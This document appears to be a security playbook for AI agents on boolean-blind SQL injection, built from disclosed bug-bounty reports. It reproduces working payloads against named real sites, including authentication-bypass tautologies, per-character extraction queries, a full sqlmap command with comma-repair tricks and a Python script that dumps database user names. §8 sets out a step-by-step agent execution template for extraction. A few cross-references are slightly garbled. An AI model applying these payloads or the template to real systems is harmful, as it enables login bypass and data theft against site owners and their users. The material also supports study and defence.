---
title: "Boolean-Blind SQL Injection — content, redirect, and tri-state oracles"
type: playbook
category: boolean-content-oracle
cwe: "CWE-89"
source_count: 14
full_bodies_available: 14
corpus: "HackerOne disclosed reports, 2014–2022 era, list seeded from github.com/shreyaschavhan/h1-reports-for-reference TOPSQLI.md, bodies fetched via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-25"
note: "Every claim traces to bodies read in full this session; bounty figures are JSON amounts where present, otherwise as stated on the source list (marked). Severity/weakness labels are archive-era historical; bodies are the class authority."
---

# Boolean-Blind SQL Injection — content, redirect, and tri-state oracles

## 1. Overview

Where the time-based cluster reads the database through a **clock** (see
`Time-Based-Blind.md`), this cluster reads it through an **observable difference
in the response**: the same request template is sent with a condition that
evaluates TRUE and with one that evaluates FALSE, and *something in the response
changes* — the body, the HTTP status, a redirect target, a JSON field, or even
the sort order of a rendered list.

Fourteen confirmed full-body cases, 2014–2022. The cluster's invariant:

> **One bit per request — so the TRUE/FALSE band pair must be demonstrated on at
> least one value the attacker already knows before any unknown character is
> claimed.**

**Case-ID scheme: `SQL-<report id>`** (e.g. `SQL-273946`).

## 2. Band vocabularies the corpus teaches (anchored cases)

### 2.1 Tri-state JSON oracle — "3", empty, and the error

SQL-117073 (Informatica, JSON POST `docId` into an ASMX ratings endpoint, 2016)
names three distinct output states and then extracts version characters through
the first two:

> for a TRUE query we get - {"d":"3"}
> for a FALSE - {"d":""}
> for a Syntax error - {"Message":"There was an error processing the request.","StackTrace":"","ExceptionType":""}

> docId:"1 and (select substring(@@version,1,1))='M'" - true
> docId:"1 and (select substring(@@version,2,1))='i'" - true

> so using this blind technique we can extract the data from Database

Three states, not two: the *syntax-error* channel is what tells the agent the
expression is still being parsed (an evaluator oracle), while TRUE/FALSE carry
bits.

### 2.2 Status bands — 302 vs 500, and a CASE-driven bisection

SQL-982202 (DoD login form, 2020) first measures the pair browser-visibly:

> returns a 302 with a login error message, while an invalid column name returns a 500 error message. Note that spaces are not accepted, so I must replace them with `/**/`.

> To summarize:
> `usr='/**/or/**/lastName!='&pwd=████████` -> 302
> `usr='/**/or/**/abc!='&pwd=███` -> 500

then drives the band *content-dependently* with a CASE expression to bisect a
row count:

> `usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/(SELECT/**/count(*)/**/FROM/**/accounts)>███0000/**/THEN/**/'a'/**/ELSE/**/███/**/END)/**/and/**/usr!='&pwd=████`

closing with the report-discipline and authorization-discipline pairs:

> I have not exfiltrated any data with the exception of column names, the table name and the fact that there are 26 user accounts in this service.

> **if you would like me to, I believe I can escalate this to allow me to login to this service, but I am not doing that without permission**

### 2.3 A published band-vocabulary table — SQL-648346

SQL-648346 (DoD `personnel.php`, 2019) *records the full TRUE/FALSE payload
vocabulary before using it* — the most reproducible-format case in the cluster:

> Payloads, what response ```True```:
> ```
> 2=2
> true
> 'test'='test'
> len('12345')=5
> 2*4*3=8*3
> ```

> Paylods, what response ```False```: (sic)
> ```
> 1=2
> false
> 'test'='admin'
> len('12345')=10
> 2*3*4=3*4
> ```

then the standard length-then-content ladder —

> Length of DB by payload is ```39```:
> ```
> GET /personnel.php?content=profile&rcnum=rc12346'+++and++(select+length(database())+=+39+)++and+'1'='1 HTTP/1.1

> ```
> GET /personnel.php?content=profile&rcnum=rc12346'+++and+(select++substr(database(),1,1)++=++'c')+and+'1'='1 HTTP/1.1

— plus the header text anchor of the marker string used for differencing:

> Text for find
> ```ame='firstName' minlength='1' maxlength='20' size='15' value='```

The report also doubles as a *regression-refutation* story: it cites its own
earlier report #512693 with *"But this vulnerability still exists!"* — see §7.

### 2.4 Boolean redirects — the inverted band trap

SQL-23014 (Uzbey, 2014) states band directions explicitly and *counter to
intuition* — printed as observed data, not assumptions:

> https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+1-- TRUE
> https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+2-- FALSE

> FALSE = will redirect to access denied
> TRUE = redirected to page not found

> fid must be a valid image id

**Agent rule**: bands are observed, never presumed; here the *true* condition
redirected to a less-expected destination than the false one, and the extraction
still worked because the agent of record recomputed directions first.

### 2.5 Authentication bypass as the first bit

Three separate organizations (2017–2020) open their reports with a
**form-succeeded/failed band** driven by a tautology:

- SQL-269279 (Starbucks/Teavana partner-id signup):

  > 4) Changed input to "1234' OR 1=1" (without double qoutes) (3.PNG)
  >     Result: This time signup succeeds!!! (4.PNG)

  against the baseline quoted in item (3): *"Signup fails"* — (sic "qoutes" in source).

- SQL-419017 (DoD, SSN field with client-side length): step list verbatim —

  > 2. Right click on the SSN field, click Inspect Element, and edit `maxlength="9"` by changing it to `maxlength="9999"` (or something similar, so that a longer payload can be put in)
  > 3. Choose a random birth date, for example, January 1, 1990.
  > 4. Enter in your SQL injection payload into the SSN field. For example, try `' OR '1'='1`.
  > 5. Click "Check Status". Your SQLi payload will execute. If you did the example payload in step 4, assuming someone has the birth date you entered, it will log in as them and check their scholarship status.

- SQL-484801 (DoD, `rememail` POST parameter) — both directions plus probe `union`:

  > Set this payload to param ```rememail```
  > ```
  > ' or '1'='1
  > ```
  > or
  > ```
  > ' or true --+
  > ```
  > …
  > But if you set another payload
  > ```
  > ' or '1'='2
  > ```
  > or
  > ```
  > ' or false --+
  > ```
  > …
  > Also if you set payload
  > ```
  > ' union select 1--
  > ```

  and the closing discipline line:

  > I did not begin to extract any data about the server or database, since this may be contrary to the rules.

- The JSON-API sibling SQL-1044716 (Zomato hyperpure, PUT body, $2,000 JSON)
  verifies its *pre-created record* instead of a login band, on a PUT:

  > 1) Proving AND condition working while using it with a valid sales id  " AND 1 = "1 --+-
  > 2) Proving AND condition false with working sales lead using AND 1=0.
  > 3) Proving adding cool as a sales lead by using OR 1=1 , which always states true.

  Step 3 documents the **write side** — an injected tautology changing a stored
  record — which is the cluster's only data-mutation demonstration.

### 2.6 The informative HTML/status sibling — SQL-1107536

SQL-1107536 (informative verdict) reduces the band difference to HTTP status 200
vs 404 on a URI path:

> "http://51.83.253.82/item/default'and%20UPPER('asd')='asd'--"   => It will give you 404
> BUT
> "http://51.83.253.82/item/default'and%20UPPER('asd')='ASD'--" => It will give you 200

(Both lines quoted as printed, including the source's flipped 404/200 mapping per
condition — see the §2.4 rule.) The report then extracts `20.9.2.2` as version
characters with:

> http://51.83.253.82/item/default'and%20substr(version(),1,1)='2'-- ==> will give you 200 OK

its provenance note — *"It's a URI path injection. The vulnerability tested on the Original IP behind the CloudflareWAF and I've already reported this in my other report #1105673"* — and its archive verdict *informative*, which the vault records verbatim.

### 2.7 Authentication-surface sibling — SQL-319279 (Khan Academy, 2018)

The verification-question transcript of the era, quoted in full:

> After submitting a single quote, I got the 500 error. after few steps, I got rid of the 500 error by forging a valid sql query which is as follows:
> https://www.khanacademy.org/translations/videos/en'%20or'1'=='1_youtube_stats.csv
> it returns to me all csv since 1 is equal to one
> when changing the boolean condition:
> https://www.khanacademy.org/translations/videos/en'%20AND'1'=='0_youtube_stats.csv
> (and '1'=='0): only the english csvs are shown.

with the form's own metadata —

> **Verified**
> Yes
> **What exploitation technique did you utilize?**
> Boolean

## 3. The ordering oracle — SQL-273946, the flagship

The highest-quality write-up in the corpus ($4,500 JSON, Grab, WordPress
Formidable Pro plugin, 2017) demonstrates what a *bit-channel-less-than-nothing*
setup looks like — the injected fragment lands in an ORDER BY of an *intermediate*
query, and the only reader is the **order of rendered rows**:

> The injected code goes in the ORDER BY clause of an intermediate query that retrieves the list of form entry ID's. Results of the manipulated query aren't directly visible. The attacker can control the order of entries appearing on the page, which is enough to communicate one bit of data from the database.

> A further complication is that any comma symbols in the injected data are specially treated and affect the resulting SQL query in a way that creates errors. With careful formatting, however, the query can be salvaged.

Then the sqlmap-side mechanics the era engineered around both constraints:

> ./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order="%2a( true=true )"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(",",-it.id%2b");order_by="id,"*true.count(",")+"id"'  --test-filter DUAL --tamper commalesslimit -D █████ --sql-query "SELECT ██████████ FROM █████ WHERE id=2"

> This works with the latest sqlmap. The "commalesslimit" tamper module helps avoiding comma symbols in any LIMIT clauses. The --eval parameter does some processing to repair queries that contain commas in the SELECT clause.

> Specifically, for each comma appearing in the order parameter, the plugin appends ",it.id" in the query. The repair code appends "-it.id+" after each comma to neutralize the effect. In other words, an injected "SELECT a,b" query would be translated to "SELECT a,it.id b" by the shortcode logic. The repair code changes it to "SELECT a, it.id-it.id+b" which evaluates to the original injected query.

with the run's last visible output line —

> [03:09:30] [INFO] fetching SQL SELECT statement query output: 'SELECT ███████ FROM ████ WHERE id=2'

— and the proof-of-concept evidence ledger quoted by name in the body's own
supporting-material notes:

> As a proof of concept I retrieved some data.
> …
> Administrator users and their password hashes:

(Contents ███-redacted in the archive; the *evidence shapes* — table list,
admin-user list, webroot — are the record.) Note also the unauthenticated entry
point line:

> The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users.

**Class invariant**: when injected SQL lands in an ORDER BY whose rows a template
renders, the bit-channel is *render order* — check that channel before declaring
an injection "not exploitable because nothing changed".

## 4. The wrapped-payload extraction loop — SQL-150156 in full

The densest extraction script of the corpus ($4,000 JSON, Uber, 2016). The
parameter under test is a **base64-encoded JSON body inside a URL query** —

> http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ==

> You can see the server sleep 12 seconds.

— confirmed via the time channel (cross-file to `Time-Based-Blind.md`), then
pivoted to a **content-length oracle**:

> I write a script to dump the database name and user name.

```python
import json
import string
import requests
from urllib import quote
from base64 import b64encode

base = string.digits + '_-@.'
payload = {"user_id": 5755, "receiver": "blog.orange.tw"}

for l in range(0, 30):
    for i in 'i'+base:
        payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#"%(l+1, i)
        new_payload = json.dumps(payload)
        new_payload = b64encode(new_payload)
        r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))

        if len(r.content)>0:
            print i,
            break
```

> The username of mysql user is `sendcloud_w@10.9.79.210`
> The database name is `sendcloud`

Two agent lessons: (a) the encoded envelope is irrelevant — decode, treat the
inner field as the carrier; (b) an oracle does not need to be clever —
`len(r.content) > 0` was sufficient and stable.

## 5. The arithmetic-boolean cousin — SQL-1102591 & SQL-1250293

Two 2021 DoD reports record integer-arithmetic pair sets that need **no quotes
and no database functions**, in a response band presumably observable through
their own rendering page — a pattern the archive labels inconsistently (see §10),
but whose transcript shape is exactly an agent's deliverable:

> -1' OR 1=1 or '4mEwSPwJ'=' => TRUE
> -1' OR 2=4 or '4mEwSPwJ'=' => FALSE
> -1' OR 3*2<(1+2+4) or '4mEwSPwJ'=' => TRUE
> -1' OR 3*2>(1+2+4) or '4mEwSPwJ'=' => FALSE

(SQL-1102591)

> -1 OR 3+159-159-1=0+0+0+1 => FALSE
> -1 OR 2+159-159-1=0+0+0+1 => TRUE
> -1 OR 3*2=6 AND 000159=000159 => TRUE
> -1 OR 3*2*0=6 AND 000159=000159 => FALSE
> -1 OR 3*2*1=6 AND 000159=000159 => TRUE

(SQL-1250293)

When a filter strips quotes and sleeps, `OR 3*2=6 AND <const>=<const>` is the
era's minimal expression-evaluation proof — and it composes naturally with time
(CONST → `SLEEP`), ordering (§3), and error (Error playbook) channels.

## 6. DBMS fingerprint by elimination — SQL-360539

A detection-only (substate *not-applicable*, kept verbatim in the vault) method
whose *shape* still deserves an agent's toolkit slot:

> 1. inject the following url with order by 1 written with char and oracle concatenation resulting in an erronous page, which indicates oracle db is used.  (sic "erronous")

> 3.then inject the following url with mysql char using order by 1, which results in no error.  so is not mysql dbms.

> 5. finally try and inject with microsoft sql server char injection using order by 1 in char concatenation. which results in no error.  so is not a microsoft sql server database.

> by process of elimination by error.  i was able to figure out which database starbucks is using for that url.

Differential *presence of a syntax error* across per-DBMS expression syntax is
itself a fingerprint oracle; quote fidelity preserved including the impact
section's *"furthder"* (sic).

## 7. Regression & referee notes

- SQL-648346: publishes an *attention block* — *"This report is #512693."* and
  *"Please send this vulnerability for review to developers, having previously triage it."* — the era's fight to secure triage for an authenticated-surface repeat (see §2.3's "other endpoint … only for authorized users" note).
- SQL-348047 (cross-file: Time playbook §7): same-host regression re-reporting.
- SQL-211988 (Legal Robot, verdict not-applicable) records a single-URL union
  probe:

  > a GET request made on GET /assets/icons/?v=9wr1emhXD568%3B'%20UNION%20SELECT%208%2C%20table_name%2C%20'vega'%20FROM%20information_schema.tables%20WHERE%20table_name%20like'%25 result up in vulnerablity  (sic "vulnerablity")

  — with an RFC-style "Blind Text Injection Differential" claim; the verdict and
  body are recorded, not endorsed: **no band pair was demonstrated**. This is
  §8's negative gate in action.

Positive negative-controls: SQL-131047 (Gratipay, informative): *"I haven't managed to inject something, but I just want to make sure that this input is filtered."* and SQL-115304 (Paragon Initiative Enterprises, not-applicable) with *"Added HTTP header 'X-Forwarded-For: ''"* probing against `paragonie.com` (the SQLi-prevention guide's own team's site). Both bodies are detection-only attempts without extraction; the vault records
them as *negative controls* — the era's own "prove it or don't submit".

## 8. Agent execution template

1. **Map sink shapes** with this cluster's carrier list: login/signup fields
   (partner ID, SSN, "partner number"), JSON PUT bodies carrying record UUIDs,
   ASMX/GraphQL acceptors (`docId`-style), URI-path slugs fed to sort/filter,
   admin list parameters (`rcnum`), short-code-driven render pipelines.
2. **Band discovery FIRST** — before any condition, render the application's
   own SUCCESS and FAILURE states and name them *specifically* (302 vs 500,
   200 vs 404, `{"d":"3"}` vs `{"d":""}`, signup OK vs rejected, HTML row order).
3. **Condition verify**: `AND 1=1` / `AND 1=0`; the arithmetic parallel from §5
   when quotes are filtered; the UPPER-case family from §2.6 when string
   comparisons are the intended channel.
4. **Known-value calibration**: begin extraction at a computed condition over a
   value *another channel has already surfaced* (a version string guess
   evaluated per-char, a rendered row count, a known-`'test'='test'` line).
5. **Extraction ladder**: `length()` first, then per-position `substr(…,i,1)='c'`
   (SQL-648346's exact line-up) or numeric-CASE bisect (SQL-982202's
   `count(*)=26` bisection).
6. **Write side** only where scope authorizes data mutation, and only with the
   pre-creation record (SQL-1044716's PUT sequence). Mutation of shared state in
   production carries the era's own discipline (SQL-484801's "rules" sentence).
7. **sqlmap as a force-multiplier, not a starting gun**: era pattern is manual
   band discovery then sqlmap verification transcript (SQL-273946's
   `--technique B --string … --tamper commalesslimit --eval …` command); the
   adaptation fight (commas, quotes, sorting) is where the report earns its
   bounty.

## 9. Validation gates

1. **Both bands demonstrated** on a control value the target itself has
   published (SQL-269279's baseline profile band; SQL-982202's invalid-column
   500) — no band, no claim. (Single-URL, no-band declarations like
   SQL-211988 end as *not-applicable* in the archive.)
2. **Per-band transcript** recorded (raw request+response) — screenshots alone
   don't suffice in this corpus (SQL-648346, SQL-117073 both pair payloads with
   observed text).
3. **Write-side claims require pre-created record + post-side check** in the
   same report (SQL-1044716's shape).
4. **Escalation statements without fabrication**: the corpus verb choice to
   emulate is SQL-982202's — *"believed possible, not performed, awaiting
   authorization"*.
5. **If no band is observable**, descend: ordering oracle (§3) → write-side
   confirmation (§2.5) → time channel (Time playbook) → OOB channel
   (Out-of-Band playbook). "Blind" is a family of oracles, not one.

## 10. Archive-era label honesty

- SQL-1044716 filed under **"Code Injection"**; body is a PUT-body SQLi.
- SQL-1250293 filed under **"Code Injection"**; body is arithmetic boolean pairs.
- SQL-983710-related-note? — no: filed correctly (see `Library-and-Framework-SQLi.md`).
- SQL-313037's own weakness label ("SQL Injection" per its body header) matches
  practice, but its *archive-era* impact phrasing — *"the XSS injection"* line —
  sits adjacent to this cluster, not in it; class authority is the query
  context, not the label.

Reported class: **CWE-89, Blind SQL Injection (boolean-based / content-based /
render order based)**.

**Cross-references**: clock channel in `Time-Based-Blind.md`; visible-output
extraction in `Error-and-Union-Output.md`; callback channel in
`Out-of-Band-Callback.md`; the escalation end-game in `SQLi-to-RCE-Chains.md`;
query-construction library bugs in `Library-and-Framework-SQLi.md`.
